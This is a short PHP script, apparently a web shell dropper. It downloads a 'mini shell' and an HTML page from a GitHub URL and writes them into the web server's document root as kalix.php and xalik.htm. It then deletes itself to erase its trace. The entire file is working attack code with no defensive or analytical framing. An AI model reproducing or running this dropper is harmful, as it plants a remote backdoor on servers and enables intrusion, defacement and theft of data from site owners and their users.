<?php
echo '<title>DONE</title>';
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);}
$check = $_SERVER['DOCUMENT_ROOT'] . "/kalix.php" ;
$text = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/mini.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."Kalix-Xalik Mini5h3LL";
}else 
  echo "not exits";
echo "done .\n " ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/xalik.htm" ;
$text2 = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/vuln.htm');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."Vuln!! patch it Now!";
}else 
  echo "not exits";
echo "done .\n " ;
@unlink(__FILE__);?>
